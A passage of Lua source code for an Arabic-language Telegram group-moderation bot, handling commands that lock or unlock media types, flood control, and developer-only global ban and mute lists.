send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الصوت بالطرد *')
end,nil)   
elseif text == 'افتح الصوت' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:vico"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الصـوت بࢪو*')
end,nil)   
end
if text == 'سد الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الكيبـبورد بࢪو*')
end,nil)   
elseif text == 'سد الكيبورد بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الكيبورد بالتقييد *')
end,nil)   
elseif text == 'سد الكيبورد بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الكيبورد بالكتم *')  
end,nil)   
elseif text == 'سد الكيبورد بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Keyboard"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الكيبورد بالطرد *')  
end,nil)   
elseif text == 'افتح الكيبورد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Keyboard"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الكيبـبورد بࢪو*')  
end,nil)   
end
if text == 'سد الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملصقـات بࢪو*')  
end,nil)   
elseif text == 'سد الملصقات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملصقات بالتقييد *')  
end,nil)
elseif text == 'سد الملصقات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملصقات بالكتم *')  
end,nil)   
elseif text == 'سد الملصقات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Sticker"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملصقات بالطرد *')  
end,nil)   
elseif text == 'افتح الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Sticker"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الملصقـات بࢪو*')  
end,nil)   
end
if text == 'سد التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التوجيـه بࢪو*')  
end,nil)   
elseif text == 'سد التوجيه بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التوجيه بالتقييد *')  
end,nil)
elseif text == 'سد التوجيه بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التوجيه بالكتم *')  
end,nil)   
elseif text == 'سد التوجيه بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:forward"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التوجيه بالطرد *')  
end,nil)   
elseif text == 'افتح التوجيه' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:forward"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > التوجـيه بࢪو *')  
end,nil)   
end
if text == 'سد الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملفـات بࢪو*')  
end,nil)   
elseif text == 'سد الملفات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملفات بالتقييد *')  
end,nil)
elseif text == 'سد الملفات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملفات بالكتم *')  
end,nil)   
elseif text == 'سد الملفات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Document"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الملفات بالطرد *')  
end,nil)   
elseif text == 'افتح الملفات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Document"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الملفـات بࢪو*')  
end,nil)   
end
if text == 'سد السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ السيلفـي بࢪو*')  
end,nil)   
elseif text == 'سد السيلفي بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ السيلفي بالتقييد *')  
end,nil)
elseif text == 'سد السيلفي بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ السيلفي بالكتم *')  
end,nil)   
elseif text == 'سد السيلفي بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Unsupported"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ السيلفي بالطرد *')  
end,nil)   
elseif text == 'افتح السيلفي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Unsupported"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > السيلفـي بࢪو *')  
end,nil)   
end
if text == 'سد الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الماركـداون بـࢪو*')  
end,nil)   
elseif text == 'سد الماركداون بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الماركداون بالتقييد *')  
end,nil)
elseif text == 'سد الماركداون بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الماركداون بالكتم *')  
end,nil)   
elseif text == 'سد الماركداون بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Markdaun"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الماركداون بالطرد *')  
end,nil)   
elseif text == 'افتح الماركداون' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Markdaun"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الماركداون بـࢪو *')  
end,nil)  
end
if text == 'سد الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الجهـات بـࢪو *')  
end,nil)   
elseif text == 'سد الجهات بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الجهات بالتقييد *')  
end,nil)
elseif text == 'سد الجهات بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الجهات بالكتم *')  
end,nil)   
elseif text == 'سد الجهات بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Contact"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الجهات بالطرد *')  
end,nil)   
elseif text == 'افتح الجهات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Contact"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الجهـات بࢪو*')  
end,nil)   
end
if text == 'سد الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ قفـلت> كلايـش بـࢪو*')  
end,nil)   
elseif text == 'سد الكلايش بالتقييد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ked')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الكلايش بالتقييد *')  
end,nil)
elseif text == 'سد الكلايش بالكتم' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'ktm')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الكلايش بالكتم *')  
end,nil)   
elseif text == 'سد الكلايش بالطرد' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Spam"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الكلايش بالطرد *')  
end,nil)   
elseif text == 'افتح الكلايش' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Spam"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الكلايش *')  
end,nil)   
end
if text == 'سد التكرار بالطرد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
send(msg.chat_id_, msg.id_,'* ⊀︰ تم سد التكرار بالطرد*')
elseif text == 'سد التكرار' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
send(msg.chat_id_, msg.id_,'* ⊀︰ تم سد التكرار*')
elseif text == 'سد التكرار بالتقييد' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
send(msg.chat_id_, msg.id_,'* ⊀︰ تم سد التكرار بالتقييد*')
elseif text == 'سد التكرار بالكتم' and Mod(msg) then 
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
send(msg.chat_id_, msg.id_,'* ⊀︰ تم سد التكرار بالكتم*')
elseif text == 'افتح التكرار' and Mod(msg) then 
database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
send(msg.chat_id_, msg.id_,'* ⊀︰ نفـتحت > التكرار*')
end
--------------------------------------------------------------------------------------------------------------
if text == 'تحديث' and Devmode(msg) then    
dofile('RiNdA.lua')  
send(msg.chat_id_, msg.id_, ' ⊀︰ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and Devmode(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ⊀︰ تم مسح قائمه العام')
return false
end
if text == ("قائمه العام") and Devmode(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ⊀︰ قائمة المحظورين عام \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد محظورين عام*"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("حظر عام") and msg.reply_to_message_id_ and Devmode(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ⊀︰ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "*⊀︰ لا تسطيع حظر البوت*عام")
return false 
end
database:sadd(bot_id..'GBan:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم حظره عام من الكروبات*'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر عام @(.*)$")  and Devmode(msg) then
local username = text:match("^حظر عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"*⊀︰ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه*")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "*⊀︰ لا تسطيع حظر البوت*عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ⊀︰ لا يمكنك حظر المطور الاساسي \n")
return false 
end
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..result.title_..'](t.me/'..(username or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم حظره عام من الكروبات*'
texts = usertext..status
database:sadd(bot_id..'GBan:User', result.id_)
else
texts = '*⊀︰ لا يوجد حساب بهاذا المعرف*'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and Devmode(msg) then
local userid = text:match("^حظر عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ⊀︰ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "*⊀︰ لا تسطيع حظر البوت*عام")
return false 
end
database:sadd(bot_id..'GBan:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم حظره عام من الكروبات*'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* '..userid..''
status  = '\n *⊀︰ تم حظره عام من الكروبات*'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("كتم عام") and msg.reply_to_message_id_ and Devmode(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, " ⊀︰ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⊀︰ لا تسطيع كتم البوت عام")
return false 
end
database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n *⊀︰ ﭑݪعضوٍَ >* ['..data.first_name_..'](t.me/'..(data.username_ or 'SourcE_RiNdA')..')'
status  = '\n *⊀︰ تم كتمه* عام من الكروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم عام @(.*)$")  and Devmode(msg) then
local username = text:match("^كتم عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
